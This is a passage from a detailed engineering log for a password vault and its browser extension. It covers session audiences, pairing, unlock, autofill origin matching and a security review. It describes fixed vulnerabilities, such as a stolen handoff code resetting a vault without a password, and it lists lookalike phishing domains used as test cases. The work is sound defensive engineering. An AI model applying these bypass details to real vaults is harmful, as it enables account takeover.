  that would have made it work is widening profile SERVICE-WIDE, which hands a
  leaked vault handoff the owner's PII, every contact's decrypted detail, the
  family tree and the role assignments. Instead `CallerGuard` gained PER-ROUTE
  audiences, profile gained a dedicated `GET /v1/contacts/grantee-candidates`
  whose whole response is a contact id, an account id and a name, and that one
  handler carries `@AllowSessionAudiences('vault')`. **The `linkedUserId` field
  first added to `ContactSummary` was REVERTED** — with a dedicated projection it
  is unnecessary, and not adding it leaves every existing profile client's
  disclosure surface exactly where M13 left it.
- **One vocabulary, two guards.** `AllowSessionAudiences` and its metadata key
  moved into `@estate/auth-guard`, so identity's own `SessionGuard` and every
  downstream `CallerGuard` read the same key and ONE fence sees every widening in
  the repo. `AUDIENCE_ROUTE_ADMITTERS` is the single declaration — identity's
  `VAULT_AUDIENCE_ROUTES` now derives from it rather than restating it — and the
  fence checks it against the real decorated handlers in both directions, plus
  refuses an entry whose service already holds the audience service-wide (a
  route-level grant that changes nothing reads as narrower than it is).
  Mutation-tested three ways: an undeclared route acquiring the decorator, a
  declared route losing it, and profile widening service-wide instead.
- **The projection is narrowed TWICE**, deliberately. Profile projects (it owns
  the data and the authorization), and the vault edge re-projects, because it is
  the only upstream response this origin parses and a later widening of profile's
  shape must not reach Zone A because nobody remembered the edge exists.
- **The ceremony is a required human step.** Each candidate is confirmed
  individually and the 80-bit fingerprint is shown, never auto-accepted:
  `configureEscrow` refuses to run with nothing confirmed. That is the only
  defence against a malicious server substituting its own key, because
  `grantee_public_key_sha256` is derived client-side from whatever key the client
  was handed and binds just as happily to a substituted one.
- **Three defects the live drive found that every unit test passed over.** The
  arranged row printed a raw UUID, so an owner could not recognise who they had
  named — which is the only reason to read an arrangement back. The status
  rendered the DDL's own word (`configured`) at a person. And "Request access"
  was gated on `armed`, **a status the schema does not have**, so a grantee could
  never have started a waiting period. All three shared one cause: every fixture
  used a vocabulary a test author invented. Fixtures are pinned to
  `002_emergency_access.sql` now, with a case that walks all six statuses against
  what the service's own `blockReason` accepts.
- **Two more caught by tests refusing to pass.** A malformed public key made
  `offerFor` throw, leaving the row on "not confirmed" with nothing said — Zone
  A's threat model treats the server as hostile, so an unparseable key is a
  refusal, not an exception. And a success message written before the screen
  re-read itself was destroyed by that re-read, so a grantee who started a
  48-hour waiting period was told nothing at all; the notice is carried INTO the
  render now rather than left behind it.
- M14's arming gate and a notifications outage are separate `ApiFailure` codes
  with separate copy — "we cannot reach anyone" and "you never confirmed your
  address" have completely different remedies. Denial is one tap and ungated;
  re-arming is step-up gated, which is the M6 asymmetry made visible.

**Proven live** on a rebuilt stack, both sides: the owner's screen listed
`Ada Grantee` through the real profile route and the edge projection; the
fingerprint the browser showed (`8K4X-KXWR-0J73-DH5V`) matched the one the
grantee's own device computed, byte for byte; arming produced an escrow the
service stores as opaque values; the grantee's request moved the policy to
`waiting` with a `releasesAt` 48 hours out; one tap stopped it; and a second
request was refused `409 denied_by_owner` — the M6 sticky denial with no
cooldown. The audit trail carried `vault.emergency.configured {grantees, threshold}`,
`requested {waitingPeriodHours}`, `denied {}`, `request_blocked {reason}` and two
`unverified_recipient {kind}` events: ids and enums only, and M14's
proceed-and-record for the OPENS class.

Also proven, against profile DIRECTLY rather than through the edge (the edge's
allowlist is not the control — a leaked handoff would be presented straight at
the service): the vault session is admitted at `/v1/contacts/grantee-candidates`
and refused 401 at `/v1/contacts`, `/v1/contacts/:id`, `/v1/profile`,
`/v1/profile/family` and `/v1/role-assignments`.

Stack counts MEASURED in both profiles rather than derived: 24/4 → 25/4 in
development, 15/13 → 16/13 in the production rehearsal. The new case runs in
both because it drives the M14 address ceremony first — minting a contact link
code is an ARMING action, so a production stack refuses an owner nobody proved.

Coverage: vault-web 89/77/86/91 (ratcheted up), auth-guard unchanged at its
98-function floor with the new per-route paths covered.

**PR4 — the security review and its fix round.**

Six discovery lenses over NAMED FILE LISTS (never the range: 128 files / 12,263
insertions is the size that stalled agents in M13), then two adversarial
verifiers per candidate on different angles — production reachability, and
is-it-already-a-documented-decision — both defaulting to refuted. 26 raw, 25
unique, 18 verified under the cap with the 7 dropped **logged by name and
hand-verified**, 10 survivors, 8 refuted. Ninth milestone running where every
confirmed finding sits in machinery the milestone introduced.

Fixed, each mutation-tested:

1. **The step-up bypass** — redemption granted step-up, and `POST
   /v1/vault/reset` is gated on step-up alone, so a stolen 60-second handoff code
   destroyed the vault with no password and no Secret Key. Redemption grants none
   now; the vault origin proves its own factor through the route PR1 widened for
   it. Proven live: `mfaLevel: none`, `stepupExpiresAt: null`, reset 403.
2. **The one-sided fingerprint ceremony** — the grantee now sees their own
   fingerprint. Proven live: the screen showed `BEM1-A582-HS7E-0JBJ` and the
   digest computed from `vault_keysets.public_key` matched exactly.
3. **The unopenable M-of-N escrow** — refused at both layers.
4. **The unverified Secret Key on password change** — verified locally by
   re-deriving the AUK and unwrapping the master key, which needs the current
   password too, so the form now asks for it.

Also: two of my own tests were proving nothing (the proxy-allowlist fence sliced
on a comment anchor against comment-stripped input, so it scanned the whole file;
the fingerprint assertion was f(x) === f(x)), a dead `digestOf` was deleted, and
the incomplete release path states its limitation before the button rather than
after.

**Found only by driving the live stack:** removing the free step-up broke vault
SETUP, because `POST /v1/vault/keyset` is gated too and the prompt had been wired
into reset, delete and publish but not enrollment — a brand-new user was refused
with no way to comply. Every gated action is wrapped now. The unit suite stayed
green throughout, because its fakes never returned `stepup_required` for those
routes.

Coverage: vault-web 90/78/86/91, ratcheted up.

### M16 — The vault browser extension (approved 2026-08-10, shipped 2026-08-12)

Autofill, which M15 deferred with a reason rather than an omission: it needs a
browser extension, which is a separate distribution artifact with its own supply
chain, and an extension holding vault-origin access reopens TB6 from a direction
no CSP can see. Sequenced AFTER M15 completes because the extension is a SECOND
CLIENT of the same SRP/2SKD protocol — building it before that protocol has one
settled client would fork it. Autofill is a docs/00 §7 deliverable.

**Shape.** `apps/vault-extension`, Manifest V3, Chromium-first and port-shaped.
Zero runtime dependencies, hand-written DOM, no bundler — the vault origin's
posture, for the vault origin's reason. `@estate/vault-crypto` gains a SECOND
declared importer, so the fence asserting WHO MAY IMPORT IT (the one M15 PR1 did
not ship among its seven) lands as data before that importer exists —
`packages/vault-crypto/test/declared-importers.spec.ts`, a table with a reason
per entry, checked in both directions and counting the browser consumer by the
absolute path it actually loads. It was promised here and in the decision log
before it was written, and shipped only at the end of PR1; that gap is recorded
in the log as the same defect PR1 opens by fixing.

**Two corrections to this brief, made before any code was written.**

- *"A non-extractable `CryptoKey` cannot be serialized" is false in the direction
  that matters.* It cannot go into `chrome.storage.session` (JSON), but it CAN be
  structured-cloned into IndexedDB and stay non-extractable across restarts —
  a fifth option the brief's premise hid, and the one that "happens to work". It
  is refused for a different reason than the brief supposes: see decision 1.
- *"Identity already has WebAuthn machinery" is true and not load-bearing.*
  `webauthn.service.ts` is a RELYING PARTY (`@simplewebauthn/server`,
  `verifyRegistrationResponse`) for Estate's own logins. Provisioning passkeys
  for third-party sites means implementing an AUTHENTICATOR, reusing essentially
  none of it. The "cheap because we already have it" premise does not survive
  contact with the code.

**The three problems, decided.**

1. *MV3 termination.* Keys live as non-extractable `CryptoKey`s in an OFFSCREEN
   DOCUMENT — the only extension context that loads vault-crypto. The service
   worker holds nothing; `chrome.storage.session` holds no key material; an
   offscreen teardown is a LOCK. IndexedDB persistence is refused because it
   yields a vault permanently open with no password, Secret Key or TOTP,
   defeating 2SKD and docs/01 §5. Raw session bytes refused because TB6 says
   "where the platform allows" and here it does. Native host refused as a second
   distribution artifact with keys outside the browser sandbox. *Residual:* while
   unlocked, code in that context decrypts everything — non-extractability stops
   exfiltration, not use. Chromium only.
   Paired with it: the extension is SERVER-ANCHORED, caching item ciphertext and
   nothing that enables an offline unlock. `VAULT_SESSION_TTL_MS` is 15 minutes
   with no renewal path, so the ceremony is step-up → SRP → full sync → the vault
   session expires and stops mattering. Client idle lock 15 min, 1–60,
   never "never". *Residual:* no unlock without connectivity; a credential saved
   on another device costs a full re-unlock.
2. *Origin matching.* Registrable domain via a VENDORED, digest-pinned Public
   Suffix List snapshot. Scheme binding, cross-origin iframes refused by default,
   never auto-submit, and a content script structurally unable to REQUEST a
   credential. Page access is `activeTab` + `scripting`, no declared content
   scripts — which also makes any later broadening a browser-enforced re-consent.
   Confusable domains are REFUSED, not warned about. *Consequence:* with
   `activeTab` the check fires at CLICK time, so the milestone refuses to fill on
   a lookalike and cannot warn someone who never opens the extension. *Residual,
   on screen:* autofill does not resist phishing.
3. *Supply chain.* Blast-radius reduction first, because it is the only control
   that works unattended: an `extension` audience admitted PER HANDLER, so an
   extension session cannot destroy a vault. Then minimum permissions pinned as
   data, reproducible builds, SLSA provenance, and a third-party-runnable
   verification procedure. *Constrained by a measurement taken in PR3b:* Chrome
   151 has DISABLED the `--load-extension` command-line switch (removed around
   137 after malware abuse), and the `DisableLoadExtensionCommandLineSwitch`
   feature override is gone with it — measured, by watching an extension fail to
   appear in the profile or among the CDP targets. So the procedure PR4 publishes
   cannot be "load it unpacked with `--load-extension`"; it has to be a digest
   comparison against the published artifact plus a manual `chrome://extensions`
   load, and whoever writes it owes that difference. *Residual, unsoftened:* a compromised update keeping
   the same permissions exfiltrates everything the user unlocks and the platform
   cannot detect it.

**Credential model — taken against the recommendation.** Pairing yields a
refresh-capable `extension`-audience session rather than a device credential
exchanged per unlock. Verification of shipped code found the escalation question
closed only accidentally (refresh rotates in place, so `audience` survives
because there is no new row), `expires_at` unextendable by refresh, and
rotation-reuse detection to be a self-revocation hazard under MV3. All three are
addressed in PR1 rather than discovered later.

**Pairing** is a typed human-readable code on M13's alphabet, minted on the APP
origin (`VaultLaunch`'s pattern) under step-up. Not the vault origin: its edge
excludes `/v1/auth/handoff` precisely so a vault session cannot mint another
credential, and minting there would chain a 15-minute no-refresh session into a
30-day refreshing one. Not `externally_connectable`: for a once-per-browser
ceremony the control is an absence.

**Transport.** The vault origin's edge gains an `Authorization: Bearer` path and
becomes the extension's single front door — one `host_permission`, reusing an
allowlist and a holds-no-credential property that already exist.

**Also in scope, because M16 makes them acute:** step-up attempt counting derived
from `auth_events` (which transitively bounds the SRP path), the first index on
that table, and the product's FIRST session-management vertical — a paired-devices
list with per-row revoke. Plus four defects found in shipped code while verifying
this plan: a fence migration 004 documents and that was never written, a fail-open
`audience` default in `SessionsRepo.create`, `HandoffService.mint`'s full-union
audience parameter, and the absence of any user-reachable session revocation.

**Deliberately NOT done:** offline unlock, Firefox, a native-messaging host,
IndexedDB key persistence, passkey provisioning (its own milestone), and writes
before PR3 has proved the page boundary read-only.

**PRs.** PR1 the boundary, the credential and the debts it makes acute · **PR2a
the extension and its transport · PR2b unlock + read · PR3a origin matching ·
PR3b fill** · PR4 writes + release pipeline · PR5 the security review. Each
carries its own docs delta.

**PR3 SPLIT TOO — seven PRs.** Origin matching is the boundary's DEFINING
control (§4 TB9), so the decision logic lands and is proved with no code running
in any page before the content script exists. Same reasoning as the PR2 split.

**PR2 SPLIT IN TWO — a recorded deviation, making this six PRs.** "Unlock +
read" assumed the extension existed; PR1 shipped the boundary and no extension
at all, so PR2 as written would have created the artifact, its transport, its
fences AND its crypto in one change. Splitting is the M15 PR1→PR2 precedent
verbatim — *prove the boundary first, put no key material behind it yet* — and
it means PR2b's SRP unlock lands on a path already driven end to end.

**Its own docs/03 delta:** TB9 (the extension against arbitrary web pages) in §3
with a §4 STRIDE block, and §6j.

#### PR1 — the boundary (the Security surface)

The `extension` audience, its pairing ceremony and the paired-devices list ship
with a UI in the same PR, so the milestone does not open a zero-callers gap of
its own while closing others: three routes with no consumer would be the M4
legal-hold shape, in the milestone that cites it.

**One step-up prompt on the page, and that is structural.** The Security page can
be refused for three different reasons now (a demo export, the standalone
elevation, and minting a pairing code), and `StepUpPrompt` labels its field
"Confirm it's you" for every caller — so two open at once are two identical
inputs neither a person nor a query can tell apart, which is the M15 PR3 defect
verbatim. A single `StepUpTarget` state admits one at a time and every other
opener is disabled while it is up. The action is bound WHERE IT IS RENDERED
rather than selected from state afterwards, so the M13 review's worse defect (a
shared retry that ran a different action than the one refused, minting a
designation the owner never chose) has no shape to reoccur in.

The page's own pre-M13 step-up form is REPLACED rather than joined, which fixed
two live defects on the way. It labelled its input "6-digit code" — the same
label as the enrollment field, two ambiguous inputs already — and it reported a
rejected TOTP code through `messageFor`, so identity's `invalid_credentials`
became "that email and password combination didn't work" on a form with neither.
That is the M12 finding, which had landed on the consent controls and the
document generator and never come back here; the enrollment form had it too, and
now both use `stepUpMessageFor`. The standalone "Verify your identity" control
STAYS, because it is the §5.1 rescue path the people surface links to by name —
a step-up is what writes `stepup.granted` and voids a death case.

**Revoking the credential you are HOLDING goes through logout.** Both kill the
same row; only logout also expires the two cookies carrying it, and revoking
without clearing them leaves a browser that still looks signed in over a dead
session — what M8's logout entry calls the worst outcome. Every other row is one
ungated click, the M6 rule: minting a pairing code is the gated half.

**`PAIRING_UNAVAILABLE` is a new BFF code**, because `startExtensionPairing`
reused `VAULT_UNAVAILABLE` for a malformed identity response — copy that
reassures the reader "nothing about your vault has changed" on a screen where
nothing was opening a vault. The M12 finding again, one surface over.
`MintedCodeSchema` is named for the wire shape rather than for the first
ceremony that used it.

**A fence for the hand-maintained copy.** `GQL_ERROR_CODES` in the web app is a
second copy of `BffErrorCode` that nothing checked, and a code the BFF adds and
the app misses degrades to `UNKNOWN` — a control firing rendered as an outage
(the M9 rule inverted). `apps/web/src/graphql/error-codes.test.ts` reads
`identity-client.ts` and asserts EQUALITY in both directions, on the
compose-parity mechanism, with an anti-vacuity floor that earned its place
immediately: the first version anchored the union's end on the next `;` and one
member's doc comment has a semicolon in its prose, so it silently scanned nine
codes of twenty-eight.

**Proven live**, against a stack rebuilt so every service runs M16 code and the
refusals are the audience table rather than version skew. A pairing code minted
through a real TOTP step-up, redeemed against identity, producing an
`extension`-audience session that answers 200 on `GET /v1/vault/keyset`, 403
`stepup_required` on both SRP legs, 403 `vault_locked` on `items` and `lock` —
admitted by audience and stopped by the next control, so reaching the API is
still not opening a vault — and 401 on `vault/reset`, both keyset writes,
`recovery-key`, every emergency-access route, `POST /v1/auth/handoff`,
`POST /v1/auth/extension/pairing`, `GET /v1/auth/sessions`, and on assets,
profile, documents, the assistant, plaid and settlement. It then appeared in the
owner's own device list as "Browser extension", was revoked in one click with no
prompt, and was dead on every route a second later. The audit trail carried
`stepup.granted` → `pairing_minted {retired:false}` → `paired {audience:
extension}` → four `pairing_failed` with no actor and empty detail, the uniform
refusal preserved in the trail as well as on the wire.

Two things the drive found that no unit test had. The Session card kept reading
"Step-up not fresh" straight after a pairing code had been minted through a
genuine step-up, because only the standalone verify path re-read the session —
a security page stating the opposite of its own current state, about exactly the
thing the page exists to report. And the row whose description was longest
wrapped its button onto the next line while its neighbours kept theirs on the
right, so the button moved with the prose.

*Noted, not fixed:* events emitted while the audit CONSUMER was still running
pre-M16 code never reached `audit_events` — an action the consumer does not know
is a `schema_violation` to it, indistinguishable from malformed input. That is a
rolling-deploy consequence rather than a defect in this change, and the old
container's logs did not survive its restart, so the rejection was inferred from
`ingestor.ts` rather than observed.

#### PR2a — the extension exists, and its transport is proven

`apps/vault-extension` is the tenth app and the first artifact in the product
that will be distributed as a signed blob through a vendor store. PR2a ships it
holding **no key material at all**: it pairs, stores an `extension`-audience
session, refreshes it, and reads one fact — whether the account has a vault —
through the vault origin's edge. That single sentence exercises the whole chain
the milestone's boundary was built for, with nothing cryptographic in it.

**The edge becomes the extension's front door.** `apps/vault-web` gains a bearer
path (`Authorization: Bearer` wins when present, the `__Host-` cookie only in its
absence — one rule, never a fallback chain) and two credential-free
exact-match routes for pairing redemption and refresh. Those reach a new
`Upstream.passThrough` that has **no bearer parameter at all**, so anonymity is a
property of the type rather than of remembering to omit an argument.
`/api/grantee-candidates` stays cookie-only: the one Zone B read on this origin
belongs to the interactive vault session, not to a credential on a device. The
edge does **not** re-implement the audience table — the services decide, PR1
measured it, and a second copy drifts.

**Verified rather than assumed:** extension pages and service workers bypass CORS
for hosts in `host_permissions` (chromium.org), while content scripts do not — so
the edge answers no preflight and its CSRF property survives untouched, and the
platform already enforces half of TB9's "the content script cannot reach the
vault".

**The manifest is the permission set, pinned as data:** `storage` and one host,
with `content_scripts`, `activeTab`, `scripting`, `offscreen`,
`externally_connectable` and `background` all absent and each named in the test
with the PR that would introduce it. The origin is read back out of the manifest
at runtime, so there is no second copy to drift (the M8 PR5 baked-value lesson).

**Seven fences**, each mutation-tested red: no dependency tree (the package
declares *zero* dependencies — even the Chrome API surface is four hand-written
declarations rather than `@types/chrome`), no HTML/script sink with zero
exemptions, one network call site, no `console.*`, no inline script or style in
the shell, no `*_INTERNAL_TOKEN`, and the shipped artifact compiled with
`types: []` so a browser module reaching for `process` fails the build.

**Found on the way, and fixed:** `turbo.json` declared only `dist/**` as build
output, so `@estate/vault-crypto`'s `dist-esm` and `vault-web`'s `public/app` and
`public/lib` were absent after any cache hit — turbo reporting a package built
that was missing half of itself. Proven by deleting all three and watching a
`FULL TURBO` hit restore them.

**Proven live** against the running stack, with the edge run as a host process so
the shared containers were untouched: a real pairing code minted through a real
TOTP step-up, redeemed through the edge; a replay refused with the uniform
`invalid_code`; `keyset` 200 while `items`/`lock` answered 403 `vault_locked`
(admitted by audience, stopped by the next control); `reset` and
`grantee-candidates` 401; `handoff` and `logout/refresh` 404 without leaving the
process; refresh rotating the pair in place with `audience: extension` intact.
The drive also reproduced the revocation residual with numbers — identity refused
the revoked token at t+0 while the vault honoured it until t+20, the tail of the
30s introspection cache.

**Not proven, stated:** CI cannot load a packed extension, so the extension's own
logic is proven against a `chrome` API double in jsdom and the transport is
proven at the edge. Loading `dist/` unpacked in a real Chrome is a manual step —
the honesty the repo applies to the Plaid live client and the Anthropic adapter.
*Measured in PR3b:* `--load-extension` is refused outright by Chrome 151, so any
recipe built on that flag is dead — re-confirmed since, by launching with it and
watching no extension appear among the CDP targets.

*CORRECTED AFTERWARDS, and the correction matters:* PR3b concluded from that
that loading "cannot be scripted" and "no CI job can ever stand in for it".
Only the first half is true. The CDP `Extensions.loadUnpacked` command works on
151 and returns the extension id, and a probe extension loaded that way was
driven end to end — service worker attached, action invoked, `executeScript`
run against a live page. So the FLAG is gone and the CAPABILITY is not, and a CI
job driving an unpacked extension over CDP is possible after all. What remains
true is that a HUMAN following `VERIFYING.md` should still use developer mode
and "Load unpacked": telling a third-party verifier to drive a debugging
protocol would be a worse instruction, not a better one. The dead sentence was
"no CI job can ever stand in for it".

#### PR2b — unlock and read

The extension opens a vault. Step-up → SRP-6a → a full sync → titles on screen,
with the master key living in a worker that the offscreen document exists to
host.

**The offscreen `reason` is now simply true.** PR2a's answer to the closed enum
was to declare `WORKERS` and MAKE it true by moving the blocking SRP maths
off-thread. Building it produced a better shape: the WORKER HOLDS THE KEY, so
the declaration is structurally accurate — the document's whole job is to spawn
and host it. It is also stronger, because the master key is a non-extractable
`CryptoKey` created inside the worker that never crosses a boundary. The
alternative would have had to move a `CryptoKey` or the raw master key bytes
across `chrome.runtime`, which every extension context receives.

**It is not a trust boundary, and the code says so.** `sendMessage` broadcasts,
so the password and Secret Key transit a channel the service worker also
receives and ignores by `target` — a filter, not isolation. All extension
contexts are one signed artifact. What the offscreen document buys is LIFETIME
and NON-EXTRACTABILITY. What the split buys is auditability: the key holder
cannot fetch and the host cannot decrypt, so the milestone's central claim has
one file to read.

**The manifest gained exactly the two keys PR2a named** — `offscreen` and
`background`, each listed there as forbidden with the PR that would introduce
it. The test moved them rather than deleting the rule. No content scripts, no
`activeTab`, no `scripting`: no page access of any kind until PR3.

**The Secret Key is remembered on disk with an opt-out** (approved), written only
after a key has actually opened the vault and forgotten on disconnect. Residual
in docs/03 §6j: two of three factors now sit on one disk, missing only the
password. It still buys no OFFLINE unlock — the wrapped master key, the SRP salt
and the KDF parameters arrive per unlock and are never stored.

**Defects found and fixed in the writing.** A wrong vault password would have
DISCONNECTED the device: the service answers `401 srp_failed`, the client mapped
every unlabelled 401 to `UNAUTHENTICATED`, and the popup forgets the pairing on
that — a per-attempt mistake with an account-level consequence. `SRP_FAILED` is
its own code, still one code for both halves of 2SKD. And a JSON array passed the
item envelope's `typeof === 'object'` check and listed as an item with no title,
claiming a different fact from the true one.

**Proven:** a genuine SRP-6a round trip in process against the server half
`vault-crypto` also ships — a wrong Secret Key refused BY THE SERVER, the master
key non-extractable, titles returned with no secret half, a version-rolled blob
listed as unreadable, locking dropping the key. `test/vault-host.spec.ts` then
searches every recorded byte for the password, the Secret Key, its ungrouped
form and the item secret. Mutations confirmed red throughout, including one that
plants the password in a request body — so the central claim's test is known to
detect a leak.

**Two of my own tests were weaker than their names**, both caught by mutation: a
shape case that omitted one field survived deleting two of five guards, and an
ordering claim could not be proved by a fixture with one item. Both rewritten.

**Coverage 97.94/91.41/96.70/99.38.** Functions went DOWN 97 → 96, a floor set
two commits earlier in the same PR — stated in `jest.config.js` rather than
quietly applied, because the package tripled after that measurement and the two
remaining uncovered functions are IndexedDB error callbacks `fake-indexeddb`
will not provoke. Entry files are excluded from coverage and the exclusion is
BOUNDED by a fence asserting each stays under twenty lines with no loop, switch
or error path.

**Not done, and owed:** the extension has never been loaded in a browser. CI
cannot load a packed artifact, so every claim above rests on the real crypto and
a `chrome` API double in jsdom, plus the transport proven live at the edge in
PR2a. The offscreen document's lifecycle, `chrome.offscreen.createDocument` from
a service worker, and the worker boundary in a real browser are all UNEXERCISED.
So is the IndexedDB measurement PR1 owes — whether a non-extractable `CryptoKey`
survives a structured clone into extension IndexedDB across a restart, which the
roadmap rejects on ceremony grounds while recording the serializability premise
as unmeasured. Both are hand-over steps with instructions, not claims.

#### PR3a — origin matching

The decision that governs every fill, landed with **no page contact**: the
extension can read the active tab's URL and say what is saved for it, and cannot
run a line of code in any page.

**The Public Suffix List, vendored and digest-pinned.** Registrable domains come
from the list — including its wildcard and exception rules — never from a
substring and never from label stripping, the two failures §4 TB9 names. It is
compiled to a module rather than read at runtime, and that was FORCED by a fence
rather than chosen: `api.ts` is the only network call site, so reading the
packaged `.dat` would mean widening that fence to admit local fetches. The `.dat`
stays byte-for-byte as published (MPL-2.0 header included) and is the pinned
artifact; the test regenerates from it in a subprocess and compares, so the
committed generated module cannot drift.

*Corrected after the fact:* that sentence was FALSE for 459 of the 10,239 rules.
The list writes internationalised suffixes as U-labels and `URL.hostname` always
returns A-labels, so those rules could never match and every registrant under
those registries collapsed onto one registrable domain — label stripping by
another route, in the paragraph claiming it could not happen. Found while scoping
PR3b, measured, and fixed at generation time before PR3b was written; the
sentence is true now. Full record in docs/03 §6j.

**A verdict, not a boolean.** `match`, `no-match`, `scheme-downgrade`,
`confusable`, `unusable` — because a refusal that reads as an absence is the
shape this repo keeps finding. §4 TB9 refuses confusables rather than warning, so
the popup SHOWS the refusal and offers nothing on it; `isFillable` is true for
exactly one verdict.

**Matching happens in the key holder**, because the item's `url` is inside the
encrypted blob. Returning every item's domain to the popup would disclose a list
of every site the user has an account with to answer a question about one origin.
The protocol gains one variant, and still none that returns a secret.

**A scope claim of mine was wrong, and the test caught it.** The confusables
decision was taken on the basis that punycode + edit-distance-1 catches `rn`/`m`.
It does not — `exarnple.com` is two edits from `example.com`. Rather than weaken
the test, the code gained an ASCII homoglyph skeleton (`rn`→`m`, `vv`→`w`,
`cl`→`d`, `1`→`l`, `0`→`o`) folded on both sides. Full UTS #39 remains a named
follow-up in §6j, and every miss stays a refusal.

**`activeTab` alone**, verified before it was relied on: it yields the tab URL at
invocation, is revoked on navigation, and needs no `tabs` permission. `scripting`
is what would turn that into running code, and it is still refused by the
manifest fence with PR3b named against it.

**Verified:** a table over the traps (`evil-example.com`,
`example.com.evil.net`, `bank.co.uk` vs `shop.co.uk`, the PSL's `*.ck`/`!www.ck`
pair) and six mutations — substring matching, label stripping, dropped scheme
binding, dropped confusable refusal, removed homoglyph fold, allowed cross-origin
frames — each confirmed red. 300 tests, 97.24/90.83/96.52/98.91.

**Unchanged and still owed:** the extension has never run in a browser, and the
IndexedDB restart measurement is outstanding. PR3a adds no code that runs in a
page, so neither moves.

#### PR3b — fill

The decision PR3a landed with no page contact now touches a page, and PR3b
opened by MEASURING the platform rather than designing against documentation —
which corrected shipped code, two documents, and one of this milestone's own
research findings.

**What `activeTab` actually grants**, in Chrome 151, against a page carrying all
three frame shapes on resolver-mapped hosts, with `host_permissions` absent so
the grant was the only thing in play:

| frame | result |
| --- | --- |
| top, `example.test` | injected |
| same-origin subframe | injected |
| `pay.example.test` (same site, different host) | **refused** |
| `other.test` | **refused** |

Host-exact, and it *does* cover same-origin subframes — which settles the
widely-repeated "activeTab grants only the tab". So `frameIsAllowed` was MORE
PERMISSIVE THAN THE PLATFORM, and then turned out to have no possible caller:
the popup cannot enumerate frames without `webNavigation` or `tabs` (the only
permission-free route is an injection into every frame *before* any origin
decision), and the injected function cannot import it because `func` is
serialized. It is DELETED, and the platform enforces the boundary instead.
**Accepted cost, stated:** a login form inside an iframe is not filled, including
a same-origin one. The per-item cross-origin opt-in is deleted too — it cannot be
built on `activeTab` at all, needing `optional_host_permissions` and a runtime
consent prompt this milestone does not have.

`allFrames: true` returns **partial results silently** (two of four frames,
`ok: true`, no error — MDN says Chrome fails the whole call; false on 151), so a
caller cannot tell "no such frame" from "not permitted". It is not in the type
declaration at all, and the fill names one frame.

**The first worker variant that returns a secret**, arriving with the gesture
requirement `worker-protocol.ts` promised since PR2b. The caller names an ITEM
and a PAGE, never a secret, and the holder re-reads the item's own encrypted
`url` and re-decides — it re-decides even after `matchesFor` just said `match`,
because the page can navigate between the two calls. So the most a compromised
popup can ask for is a fill the user's own gesture could already have driven.
The fence guarding that boundary was rewritten FIRST: `satisfies` plus a
hand-counted length are both subset checks, and a seventh variant passed both.

**The injected function is mostly absences** — no closure, no `chrome`, no fetch,
no crypto import, never submits, and never dispatches `blur` (a page may submit
on one). The first draft called `focus()` to look like a user, which is itself
how a blur fires; its own test caught it. A naive `el.value =` is enough, because
React's value tracker lives in the page's world and is invisible from an isolated
one — the usual prototype-setter advice is for page-context scripts.
`inject.ts` is the one module that may run code in a page, fenced like `api.ts`
is for the network, because `executeScript` is a second egress that fence cannot
see.

**A defect in PR2b that only a browser could show.** An offscreen document gets
only `chrome.runtime`'s messaging surface — no `getManifest` — and the key holder
lives in one, so `config.ts` threw on every vault request and `api.ts` reported
it as `NETWORK`. **The extension could never have unlocked a vault.** jsdom could
not have caught it: the chrome double supplies `getManifest` unconditionally, so
the double was more generous than the platform. The origin is generated at build
time now, with a real build asserting it and the manifest agree.

**Proven end to end** against the running stack — real account, real TOTP
step-up, real SRP unlock, item sealed by the same `@estate/vault-crypto` the
worker opens: pairing, unlock, `{kind: match, domain: example.test}`, the fill
returning the credential for its own page and refusing both `other.test` and the
lookalike `exarnple.test` with an indistinguishable `null`. Then the injection
verified IN THE PAGE: filled, the page's React-style tracker fired,
`activeElement` still `BODY`, URL unchanged, nothing submitted, same-origin
subframe left empty.

**Also fixed:** every fixture in the package used `itemType: 'login'`, which is
not in `VAULT_ITEM_TYPES` — found when the seed was refused `400`. Latent, since
the extension never writes an item, and now fenced by scanning the service's own
declaration rather than copying it.

**Owed by whoever ships next — discharged in PR4b:** `--load-extension` is
disabled in Chrome 151, so PR4's "third-party-runnable verification procedure"
cannot be phrased as loading unpacked from the command line. `VERIFYING.md`
step 5 is a manual `chrome://extensions` load, and says why.

#### PR4a — writes

`createItem` and `updateItem`, admitted to the `extension` audience **in the same
change as their callers** — and the first draft of this PR broke that rule, which
an adversarial pass caught: the grant landed while `sealItem` was reachable from
nothing. An aspirational grant is the M8 zero-holder-edge shape, and the callers
followed in the same PR rather than the next one.

**AUTHORING IS TYPED IN THE POPUP.** Capturing a credential from a page after a
sign-in — what a password manager normally does — needs a page observing form
submissions, i.e. a standing content script, which PR3b refused and the manifest
fence still forbids. So the write surface adds NO page surface at all. The cost
is real and belongs on screen: there is no "save this login?" prompt.

**AN EDIT NEEDS NO READ.** The popup cannot open an item, and giving it that
ability would have made it a general vault reader in the PR whose subject is
what a paired session can reach. The key holder MERGES instead: the caller sends
only the fields it is changing, and the plaintext it did not send is never sent
back. Absent means unchanged — a blank field must not erase a password the user
cannot see — while an explicit empty string is a real value, the profile-SSN
distinction. Consequence, stated in the form's own copy: clearing a field is not
expressible in the extension.

**THE VERSION IS THE SUBTLE PART.** The service writes `locked.blob_version + 1`
after comparing `If-Match` to the row it locks, and the version is inside the
AEAD's AAD — so an update seals for the SUCCESSOR of what it read and sends what
it read in the header. Reversed, the row lands unopenable and nothing in the
response says so. The item summary therefore carries the version it was read at:
re-reading it at write time would make the check pass every time and defeat it.

**`deleteItem` IS NOT ADMITTED**, and the milestone's "an extension session
cannot destroy a vault" is narrowed rather than restated. The keyset survives —
`reset`, both keyset routes and all eleven emergency routes stay refused — but
an unlocked extension can overwrite every ITEM, and while `vault_items_versions`
holds the prior image, no production code reads it. Full record in docs/03 §6j,
along with the sharpest consequence: the item's `url` lives inside the blob, so
anything that can write an item can repoint where its credential fills. Write
and fill are one trust level.

**Three closed-set fences fired**, once per widening: `seal` and `reseal` at the
worker boundary and `create`/`update` at the popup one, each a compile error
naming the new variant. The popup union had no exhaustive test before this PR
and now has one. PR1's own "writes; PR4 decides this, not PR1" cases were
rewritten rather than deleted, and the derived refused count moved 18 → 16 —
still a hand-written number, because deriving it from the admitted list would
make it agree with any widening automatically.

#### PR4b — the release pipeline

The milestone's supply-chain claim is **what ships is what a reviewer reads**,
and it is worth nothing unless somebody with no relationship to this project can
check it. Three pieces: a reproducible archive, a CI job that proves it and
attests the result, and a procedure a third party can actually run.

**THE ARCHIVE IS WRITTEN, NOT `zip`-ED.** A ZIP is non-deterministic in five
